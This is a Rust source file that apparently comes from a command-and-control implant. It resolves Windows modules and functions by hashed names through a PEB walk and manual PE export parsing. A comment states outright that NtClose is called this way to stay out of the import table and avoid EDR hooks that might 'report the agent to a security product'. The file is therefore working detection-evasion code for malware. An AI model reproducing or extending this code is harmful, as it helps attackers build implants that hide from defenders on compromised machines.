#![allow(dead_code)]
#![no_std]

include!(concat!(env!("OUT_DIR"), "/api_hashes.rs"));

#[inline(always)]
pub fn hash_str(bytes: &[u8]) -> u32 {
    let mut hash: u32 = SEED;
    for &b in bytes {
        if b == 0 {
            break;
        }
        hash = hash.rotate_right(13) ^ (b.to_ascii_lowercase() as u32);
    }
    hash
}

#[inline(always)]
pub fn hash_wstr(bytes: &[u16]) -> u32 {
    let mut hash: u32 = SEED;
    for &c in bytes {
        if c == 0 {
            break;
        }
        // Fold each UTF-16 code unit to lowercase and mix both bytes into the
        // hash.  Truncating to u8 breaks for non-ASCII module names (CJK, etc.).
        let lo = (c as u8).to_ascii_lowercase();
        let hi = ((c >> 8) as u8).to_ascii_lowercase();
        hash = hash.rotate_right(13) ^ (lo as u32);
        hash = hash.rotate_right(13) ^ (hi as u32);
    }
    hash
}

#[inline(always)]
fn is_forwarder(func_rva: usize, export_dir_rva: usize, export_dir_size: usize) -> bool {
    func_rva >= export_dir_rva && func_rva < export_dir_rva.saturating_add(export_dir_size)
}

/// Maximum recursion depth for forwarded-export resolution.
/// Forwarder chains deeper than this are treated as circular/malicious and
/// resolution returns `None` instead of overflowing the stack.
const MAX_FORWARDER_DEPTH: u32 = 8;

#[cfg(target_os = "windows")]
unsafe fn resolve_forwarded_export(dll_base: usize, func_rva: usize, depth: u32) -> Option<usize> {
    if depth >= MAX_FORWARDER_DEPTH {
        return None;
    }
    const MAX_FORWARDER_STR_LEN: usize = 512;
    const MAX_MODULE_WIDE_LEN: usize = 260;

    let forwarder_ptr = (dll_base + func_rva) as *const u8;
    let mut forwarder_len = 0usize;
    while forwarder_len < MAX_FORWARDER_STR_LEN && *forwarder_ptr.add(forwarder_len) != 0 {
        forwarder_len += 1;
    }
    if forwarder_len == 0 || forwarder_len >= MAX_FORWARDER_STR_LEN {
        return None;
    }

    let forwarder = core::slice::from_raw_parts(forwarder_ptr, forwarder_len);
    let mut dot_index = None;
    for i in 0..forwarder_len {
        if forwarder[i] == b'.' {
            dot_index = Some(i);
            break;
        }
    }
    let dot = dot_index?;
    if dot == 0 || dot + 1 >= forwarder_len {
        return None;
    }

    let module_name = &forwarder[..dot];
    let function_name = &forwarder[dot + 1..];

    if module_name.len() >= MAX_MODULE_WIDE_LEN {
        return None;
    }

    let mut module_wide = [0u16; MAX_MODULE_WIDE_LEN];
    for i in 0..module_name.len() {
        module_wide[i] = module_name[i] as u16;
    }

    // Forwarder module names are typically extensionless (e.g. "NTDLL"),
    // while PEB BaseDllName entries include ".dll".
    let module_base = get_module_handle_by_hash(hash_wstr(&module_wide[..module_name.len()]))
        .or_else(|| {
            if module_name.len() + 4 >= MAX_MODULE_WIDE_LEN {
                return None;
            }
            module_wide[module_name.len()] = b'.' as u16;
            module_wide[module_name.len() + 1] = b'd' as u16;
            module_wide[module_name.len() + 2] = b'l' as u16;
            module_wide[module_name.len() + 3] = b'l' as u16;
            get_module_handle_by_hash(hash_wstr(&module_wide[..module_name.len() + 4]))
        })?;

    let function_hash = hash_str(function_name);
    _get_proc_address_by_hash_depth(module_base, function_hash, depth + 1)
}

/// Walk the Windows PEB loader list and return the base address of the module
/// whose name hashes to `target_hash` using [`hash_wstr`].
///
/// # Safety
///
/// Must only be called on Windows x86-64.  The function dereferences raw
/// pointers derived from the TEB (`gs:[0x30]`) and the PEB loader data
/// structure — these are valid for the lifetime of the process but are
/// inherently unsafe raw-pointer reads.
#[cfg(all(target_arch = "x86_64", target_os = "windows"))]
pub unsafe fn get_module_handle_by_hash(target_hash: u32) -> Option<usize> {
    use core::arch::asm;
    let teb: usize;
    asm!("mov {}, gs:[0x30]", out(reg) teb);
    let peb = *(teb as *const usize).add(12) as *const u8;
    let ldr = *(peb.add(0x18) as *const usize) as *const u8;
    let mut module_list = *(ldr.add(0x20) as *const usize) as *const u8;

    while !core::ptr::eq(module_list, ldr.add(0x20)) {
        // LDR_DATA_TABLE_ENTRY offsets when walking via InMemoryOrderLinks.Flink
        // (module_list points to InMemoryOrderLinks at struct +0x10):
        //   +0x20  DllBase
        //   +0x48  BaseDllName.Length (u16, byte count)
        //   +0x50  BaseDllName.Buffer (pointer to UTF-16)
        let base_dll_name_ptr = *(module_list.add(0x50) as *const usize) as *const u16;
        let base_dll_name_len = *(module_list.add(0x48) as *const u16) as usize / 2;

        if !base_dll_name_ptr.is_null() && base_dll_name_len > 0 {
            let slice = core::slice::from_raw_parts(base_dll_name_ptr, base_dll_name_len);
            if hash_wstr(slice) == target_hash {
                return Some(*(module_list.add(0x20) as *const usize));
            }
        }
        module_list = *(module_list as *const usize) as *const u8;
    }
    None
}

/// Walk the PE export directory at `dll_base` and return the address of the
/// export whose name hashes to `target_hash` using [`hash_str`].
///
/// # Safety
///
/// `dll_base` must be a valid, fully-mapped PE image base with a correct DOS
/// and NT header.  The export directory and all name/ordinal arrays must be
/// accessible and not mutated for the duration of the call.
#[cfg(all(target_arch = "x86_64", target_os = "windows"))]
pub unsafe fn get_proc_address_by_hash(dll_base: usize, target_hash: u32) -> Option<usize> {
    _get_proc_address_by_hash_depth(dll_base, target_hash, 0)
}

#[cfg(all(target_arch = "x86_64", target_os = "windows"))]
unsafe fn _get_proc_address_by_hash_depth(dll_base: usize, target_hash: u32, depth: u32) -> Option<usize> {
    let dos_magic = *(dll_base as *const u16);
    if dos_magic != 0x5A4D {
        return None;
    }

    let e_lfanew = *((dll_base + 0x3C) as *const u32) as usize;
    let nt_headers = dll_base + e_lfanew;
    let signature = *(nt_headers as *const u32);
    if signature != 0x4550 {
        return None;
    }

    let opt_header = nt_headers + 0x18;
    let export_dir_rva = *((opt_header + 0x70) as *const u32) as usize;
    if export_dir_rva == 0 {
        return None;
    }

    let export_dir = dll_base + export_dir_rva;
    let export_dir_size = *((export_dir + 0x14) as *const u32) as usize;
    let num_names = *((export_dir + 0x18) as *const u32);
    let rva_funcs = *((export_dir + 0x1C) as *const u32) as usize;
    let rva_names = *((export_dir + 0x20) as *const u32) as usize;
    let rva_ords = *((export_dir + 0x24) as *const u32) as usize;

    // Read SizeOfImage from the PE optional header for post-resolution
    // address-range validation (guards against ordinal-based misresolution
    // after Windows updates that shift function RVAs).
    let size_of_image = *((opt_header + 0x38) as *const u32) as usize;

    let names = (dll_base + rva_names) as *const u32;
    let funcs = (dll_base + rva_funcs) as *const u32;
    let ords = (dll_base + rva_ords) as *const u16;

    for i in 0..num_names {
        let name_ptr = (dll_base + (*names.add(i as usize)) as usize) as *const u8;
        let mut name_len = 0;
        while *name_ptr.add(name_len) != 0 {
            name_len += 1;
        }

        let slice = core::slice::from_raw_parts(name_ptr, name_len);
        if hash_str(slice) == target_hash {
            let ord = *ords.add(i as usize) as usize;
            let func_rva = *funcs.add(ord) as usize;
            if is_forwarder(func_rva, export_dir_rva, export_dir_size) {
                return resolve_forwarded_export(dll_base, func_rva, depth);
            }
            // Validate resolved address falls within the module's VA range.
            // After Windows updates, ordinal tables can shift and a stale
            // hash match may resolve to the wrong RVA outside the image.
            if func_rva >= size_of_image {
                return None;
            }
            return Some(dll_base + func_rva);
        }
    }
    None
}

#[cfg(all(target_arch = "x86_64", not(target_os = "windows")))]
pub unsafe fn get_module_handle_by_hash(_target_hash: u32) -> Option<usize> {
    None
}

#[cfg(all(target_arch = "x86_64", not(target_os = "windows")))]
pub unsafe fn get_proc_address_by_hash(_dll_base: usize, _target_hash: u32) -> Option<usize> {
    None
}

/// aarch64 Windows: PEB is at TPIDR_EL0 + 0x60 (same TEB layout as x86_64).
/// The LDR module-list walk is identical to the x86_64 path; only the
/// register used to reach the TEB differs (`mrs tpidr_el0` instead of
/// `mov gs:[0x30]`).
#[cfg(all(target_arch = "aarch64", target_os = "windows"))]
pub unsafe fn get_module_handle_by_hash(target_hash: u32) -> Option<usize> {
    use core::arch::asm;
    let teb: usize;
    // On aarch64 Windows the TEB pointer is stored in TPIDR_EL0.
    asm!("mrs {}, tpidr_el0", out(reg) teb, options(nostack, nomem));
    // TEB+0x60 → PEB pointer (same offset as x86_64).
    let peb = *(teb as *const usize).add(12) as *const u8; // offset 0x60 / 8 = 12
    let ldr = *(peb.add(0x18) as *const usize) as *const u8;
    let mut module_list = *(ldr.add(0x20) as *const usize) as *const u8;

    while module_list as usize != ldr.add(0x20) as usize {
        // LDR_DATA_TABLE_ENTRY offsets when walking via InMemoryOrderLinks.Flink
        // (module_list points to InMemoryOrderLinks at struct +0x10):
        //   +0x20  DllBase
        //   +0x48  BaseDllName.Length (u16, byte count)
        //   +0x50  BaseDllName.Buffer (pointer to UTF-16)
        let base_dll_name_ptr = *(module_list.add(0x50) as *const usize) as *const u16;
        let base_dll_name_len = *(module_list.add(0x48) as *const u16) as usize / 2;

        if !base_dll_name_ptr.is_null() && base_dll_name_len > 0 {
            let slice = core::slice::from_raw_parts(base_dll_name_ptr, base_dll_name_len);
            if hash_wstr(slice) == target_hash {
                return Some(*(module_list.add(0x20) as *const usize));
            }
        }
        module_list = *(module_list as *const usize) as *const u8;
    }
    None
}

#[cfg(all(target_arch = "aarch64", target_os = "windows"))]
pub unsafe fn get_proc_address_by_hash(dll_base: usize, target_hash: u32) -> Option<usize> {
    _get_proc_address_by_hash_depth(dll_base, target_hash, 0)
}

#[cfg(all(target_arch = "aarch64", target_os = "windows"))]
unsafe fn _get_proc_address_by_hash_depth(dll_base: usize, target_hash: u32, depth: u32) -> Option<usize> {
    // Export directory parsing is identical to x86_64: PE32+ format is the
    // same for both architectures; only the machine type in FileHeader differs.
    let dos_magic = *(dll_base as *const u16);
    if dos_magic != 0x5A4D {
        return None;
    }

    let e_lfanew = *((dll_base + 0x3C) as *const u32) as usize;
    let nt_headers = dll_base + e_lfanew;
    if *(nt_headers as *const u32) != 0x4550 {
        return None;
    }

    let opt_header = nt_headers + 0x18;
    let export_dir_rva = *((opt_header + 0x70) as *const u32) as usize;
    if export_dir_rva == 0 {
        return None;
    }

    let export_dir = dll_base + export_dir_rva;
    let export_dir_size = *((export_dir + 0x14) as *const u32) as usize;
    let num_names = *((export_dir + 0x18) as *const u32);
    let rva_funcs = *((export_dir + 0x1C) as *const u32) as usize;
    let rva_names = *((export_dir + 0x20) as *const u32) as usize;
    let rva_ords = *((export_dir + 0x24) as *const u32) as usize;

    // Read SizeOfImage from the PE optional header for post-resolution
    // address-range validation (guards against ordinal-based misresolution
    // after Windows updates that shift function RVAs).
    let size_of_image = *((opt_header + 0x38) as *const u32) as usize;

    let names = (dll_base + rva_names) as *const u32;
    let funcs = (dll_base + rva_funcs) as *const u32;
    let ords = (dll_base + rva_ords) as *const u16;

    for i in 0..num_names {
        let name_ptr = (dll_base + (*names.add(i as usize)) as usize) as *const u8;
        let mut name_len = 0usize;
        while *name_ptr.add(name_len) != 0 {
            name_len += 1;
        }

        let slice = core::slice::from_raw_parts(name_ptr, name_len);
        if hash_str(slice) == target_hash {
            let ord = *ords.add(i as usize) as usize;
            let func_rva = *funcs.add(ord) as usize;
            if is_forwarder(func_rva, export_dir_rva, export_dir_size) {
                return resolve_forwarded_export(dll_base, func_rva, depth);
            }
            // Validate resolved address falls within the module's VA range.
            if func_rva >= size_of_image {
                return None;
            }
            return Some(dll_base + func_rva);
        }
    }
    None
}

/// aarch64 Linux: no PEB equivalent.  Use dl_iterate_phdr via a
/// platform-specific out-of-crate call.  Returning None here keeps the
/// `no_std` constraint; callers that need module handles on aarch64 Linux
/// should use `dlopen`/`dlsym` directly from agent code.
#[cfg(all(target_arch = "aarch64", not(target_os = "windows")))]
pub unsafe fn get_module_handle_by_hash(_target_hash: u32) -> Option<usize> {
    None
}

#[cfg(all(target_arch = "aarch64", not(target_os = "windows")))]
pub unsafe fn get_proc_address_by_hash(_dll_base: usize, _target_hash: u32) -> Option<usize> {
    None
}

#[cfg(not(any(target_arch = "x86_64", target_arch = "aarch64")))]
pub unsafe fn get_module_handle_by_hash(_target_hash: u32) -> Option<usize> {
    None
}

#[cfg(not(any(target_arch = "x86_64", target_arch = "aarch64")))]
pub unsafe fn get_proc_address_by_hash(_dll_base: usize, _target_hash: u32) -> Option<usize> {
    None
}

// ── close_handle: NtClose via PEB walk (M-25 fix) ──────────────────────────
//
// Closes a kernel handle using NtClose resolved through the PEB walker so the
// call does not appear in the module's IAT and is not subject to user-space
// hooks installed by EDR products on `kernel32!CloseHandle`.
//
// If NtClose cannot be resolved (e.g. ntdll missing from PEB on a stripped
// process), the function silently returns and the handle is leaked.  This is
// preferable to falling back to the hooked CloseHandle in a C2 agent: a
// leaked handle is a process-lifetime resource at worst, whereas a hooked
// API call may report the agent to a security product.

#[cfg(all(target_arch = "x86_64", target_os = "windows"))]
pub unsafe fn close_handle(handle: *mut core::ffi::c_void) {
    use core::sync::atomic::{AtomicUsize, Ordering};
    static NT_CLOSE_ADDR: AtomicUsize = AtomicUsize::new(0);
    let addr = NT_CLOSE_ADDR.load(Ordering::Relaxed);
    let resolved = if addr != 0 {
        addr
    } else {
        let ntdll = get_module_handle_by_hash(HASH_NTDLL_DLL).unwrap_or(0);
        let a = if ntdll != 0 {
            get_proc_address_by_hash(ntdll, HASH_NTCLOSE).unwrap_or(0)
        } else {
            0
        };
        if a != 0 {
            NT_CLOSE_ADDR.store(a, Ordering::Relaxed);
        }
        a
    };
    if resolved != 0 {
        type NtCloseFn = unsafe extern "system" fn(*mut core::ffi::c_void) -> i32;
        let nt_close: NtCloseFn = core::mem::transmute(resolved as *const ());
        nt_close(handle);
    }
}

#[cfg(all(target_arch = "x86_64", not(target_os = "windows")))]
pub unsafe fn close_handle(_handle: *mut core::ffi::c_void) {
    // No-op on non-Windows targets; CloseHandle is a Windows-only concept.
}

#[cfg(all(target_arch = "aarch64", target_os = "windows"))]
pub unsafe fn close_handle(handle: *mut core::ffi::c_void) {
    use core::sync::atomic::{AtomicUsize, Ordering};
    static NT_CLOSE_ADDR: AtomicUsize = AtomicUsize::new(0);
    let addr = NT_CLOSE_ADDR.load(Ordering::Relaxed);
    let resolved = if addr != 0 {
        addr
    } else {
        let ntdll = get_module_handle_by_hash(HASH_NTDLL_DLL).unwrap_or(0);
        let a = if ntdll != 0 {
            get_proc_address_by_hash(ntdll, HASH_NTCLOSE).unwrap_or(0)
        } else {
            0
        };
        if a != 0 {
            NT_CLOSE_ADDR.store(a, Ordering::Relaxed);
        }
        a
    };
    if resolved != 0 {
        type NtCloseFn = unsafe extern "system" fn(*mut core::ffi::c_void) -> i32;
        let nt_close: NtCloseFn = core::mem::transmute(resolved as *const ());
        nt_close(handle);
    }
}

#[cfg(not(any(
    all(target_arch = "x86_64", target_os = "windows"),
    all(target_arch = "x86_64", not(target_os = "windows")),
    all(target_arch = "aarch64", target_os = "windows")
)))]
pub unsafe fn close_handle(_handle: *mut core::ffi::c_void) {
    // No-op on non-Windows targets; CloseHandle is a Windows-only concept.
}
